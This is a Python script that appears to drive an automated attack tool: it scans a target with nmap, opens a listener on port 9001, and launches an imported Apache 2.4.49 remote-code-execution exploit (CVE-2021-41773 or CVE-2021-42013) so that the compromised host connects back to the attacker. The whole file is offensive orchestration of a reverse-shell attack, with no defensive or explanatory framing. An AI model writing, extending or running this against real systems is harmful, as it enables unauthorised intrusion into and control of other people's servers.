import argparse
import socket
import recon
from multiprocessing import Process
import plugins.initial_access.plugin_initial_access_apache2_4_49_RCE as plugin_initial_access_apache2_4_49_RCE


def listener():
    s = socket.socket()
    s.bind((LOCAL_ADDRESS, LOCAL_PORT))
    print('[+] Listening on {}:{}'.format(LOCAL_ADDRESS, LOCAL_PORT))
    s.listen()
    client_socket, client_address = s.accept()
    print('[+] {}:{} connected'.format(client_address[0], client_address[1]))

def exploit():
    try:
        res = plugin_initial_access_apache2_4_49_RCE.exploit(args.target_ip, i['port'], LOCAL_ADDRESS, LOCAL_PORT)
        if res is True:
            print('[+] Exploit was successful !')
    except Exception as e:
        print(e)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()

    parser.add_argument('-t', '--target_ip', type=str, help='ip to target', required=True)
    args = parser.parse_args()
    res_recon = recon.nmap_scan(args.target_ip)

    LOCAL_ADDRESS = '0.0.0.0'
    LOCAL_PORT = 9001
    BUFFER_SIZE = 1024 * 128
    SEPARATOR = '<sep>'

    for i in res_recon:
        print('[+] Attacking port {}'.format(i['port']))
        if i['port'] == '4444':
            print('[+] Attempting to gain access with CVE-2021-41773 or CVE-2021-42013...')
            listener_process = Process(target=listener)
            listener_process.start()
            print('[+] Sending payload')
            exploit_process = Process(target=exploit)
            exploit_process.start()
            listener_process.join()
            exploit_process.join()
        else:
            print('[-] No exploit available for this port')